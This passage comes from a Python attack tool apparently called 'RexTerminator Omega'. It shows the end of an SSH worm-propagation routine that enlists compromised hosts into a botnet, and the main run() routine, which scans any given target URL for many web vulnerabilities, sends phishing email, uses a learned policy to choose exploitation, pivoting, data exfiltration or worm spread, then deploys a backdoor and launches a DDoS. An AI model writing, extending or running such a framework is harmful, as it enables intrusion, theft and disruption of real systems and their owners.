                        self.botnet.append(target)
                        ssh.close()
                        success = True
                except:
                    pass
        self.update_rl_model("propagate", success)

    def run(self):
        print(f"[*] Starting RexTerminator Omega on {self.target_url}...")
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)

        self.setup_proxies()
        self.network_scan()
        self.crawl()

        tasks = []
        for url in self.urls_to_test:
            tasks.append(self.pool.apply_async(self.fingerprint_server, (url,)))
            tasks.append(self.pool.apply_async(self.check_cve, (url,)))
            tasks.append(self.pool.apply_async(self.test_sql_injection, (url,)))
            tasks.append(self.pool.apply_async(self.test_xss, (url,)))
            tasks.append(self.pool.apply_async(self.test_lfi, (url,)))
            tasks.append(self.pool.apply_async(self.test_open_redirect, (url,)))
            tasks.append(self.pool.apply_async(self.test_ssrf, (url,)))
            tasks.append(self.pool.apply_async(self.test_rce, (url,)))
            tasks.append(self.pool.apply_async(self.test_xxe, (url,)))
            tasks.append(self.pool.apply_async(self.test_idor, (url,)))
            tasks.append(self.pool.apply_async(self.test_misconfigs, (url,)))
            tasks.append(self.pool.apply_async(self.test_zero_day, (url,)))
            tasks.append(self.pool.apply_async(self.fuzz_for_zero_days, (url,)))

        tasks.append(self.pool.apply_async(self.test_csrf, ()))
        tasks.append(self.pool.apply_async(self.test_file_upload, (self.target_url,)))

        for task in tasks:
            task.wait()

        asyncio.run(self.send_phishing_email("target@example.com"))

        self.train_model()
        self.train_rl_model()

        for vuln in self.vulnerabilities:
            if self.predict_exploitability(vuln):
                action = self.choose_next_action()
                if action == "exploit":
                    if vuln["type"] == "SQL Injection":
                        self.exploit_sql_injection(vuln)
                    elif vuln["type"] == "XSS":
                        self.exploit_xss(vuln)
                    elif vuln["type"] == "LFI":
                        self.exploit_lfi(vuln)
                    elif vuln["type"] == "Open Redirect":
                        self.exploit_open_redirect(vuln)
                    elif vuln["type"] == "CSRF":
                        self.exploit_csrf(vuln)
                    elif vuln["type"] == "SSRF":
                        self.exploit_ssrf(vuln)
                    elif vuln["type"] == "RCE":
                        self.exploit_rce(vuln)
                    elif vuln["type"] == "XXE":
                        self.exploit_xxe(vuln)
                    elif vuln["type"] == "IDOR":
                        self.exploit_idor(vuln)
                    elif vuln["type"] == "File Upload":
                        self.exploit_file_upload(vuln)
                    elif vuln["type"] == "Zero-Day":
                        self.exploit_zero_day(vuln)
                elif action == "pivot":
                    self.pivot_network()
                elif action == "exfiltrate":
                    self.exfiltrate_data()
                elif action == "propagate":
                    self.propagate_worm()

        self.deploy_backdoor()
        self.launch_ddos()

        self.retrain_ml_model()
        print("[*] Attack completed. Check rexterminator.log for details.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python rexterminator_omega.py <target_url>")
        sys.exit(1)
    target_url = sys.argv[1]
    rex = RexTerminatorOmega(target_url)
    rex.run()
